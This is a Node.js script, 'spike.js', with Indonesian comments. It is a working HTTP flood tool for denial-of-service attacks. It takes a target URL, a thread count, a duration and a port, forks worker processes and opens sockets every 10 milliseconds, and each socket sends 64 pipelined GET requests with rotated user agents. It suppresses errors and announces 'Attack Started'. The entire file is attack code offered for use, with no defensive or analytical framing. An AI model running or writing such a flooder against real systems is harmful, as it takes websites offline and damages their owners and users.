const fs = require('fs');
const url = require('url');
const net = require('net');
const cluster = require('cluster');

// Validasi argumen
if (process.argv.length <= 4) {
    console.log("node spike.js <url> <threads> <time> <port>");
    process.exit(-1);
}

let target = process.argv[2];
const threads = parseInt(process.argv[3], 10);
const time = parseInt(process.argv[4], 10);
const port = parseInt(process.argv[5], 10) || 80;

// Tambahkan http:// jika user tidak menyertakan skema
if (!/^https?:\/\//i.test(target)) {
    target = 'http://' + target;
}

const parsed = url.parse(target);
const host = parsed.hostname || parsed.host;

require('events').EventEmitter.defaultMaxListeners = 0;
process.setMaxListeners(0);

process.on('uncaughtException', function () { });
process.on('unhandledRejection', function () { });

let userAgents = [];

try {
    userAgents = fs.readFileSync('ua.txt', 'utf8').split('\n');
} catch (err) {
    console.error('\x1b[31m[ERROR] Missing ua.txt file\n' + err);
    process.exit(-1);
}

if (cluster.isMaster) {
    for (let i = 0; i < threads; i++) {
        cluster.fork();
    }
    console.clear();
    console.log(`\x1b[33m(!)\x1b[37m Attack Started`);
    console.log(`\x1b[31m[INFO] SPIKE DANDIER`);
    setTimeout(() => {
        process.exit(1);
    }, time * 1000);
} else {
    startFlood();
}

function startFlood() {
    const int = setInterval(() => {
        const s = new net.Socket();
        s.connect(port, host);
        s.setTimeout(10000);
        for (let i = 0; i < 64; i++) {
            s.write(
                'GET ' + target + ' HTTP/1.1\r\n' +
                'Host: ' + parsed.host + '\r\n' +
                'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8\r\n' +
                'User-Agent: ' + userAgents[Math.floor(Math.random() * userAgents.length)] + '\r\n' +
                'Upgrade-Insecure-Requests: 1\r\n' +
                'Accept-Encoding: gzip, deflate\r\n' +
                'Accept-Language: en-US,en;q=0.9\r\n' +
                'Cache-Control: max-age=0\r\n' +
                'Connection: Keep-Alive\r\n\r\n'
            );
        }
        s.on('data', function () {
            setTimeout(() => {
                s.destroy();
            }, 5000);
        });
        s.on('error', () => {
            s.destroy();
        });
    }, 10);

    setTimeout(() => clearInterval(int), time * 1000);
}
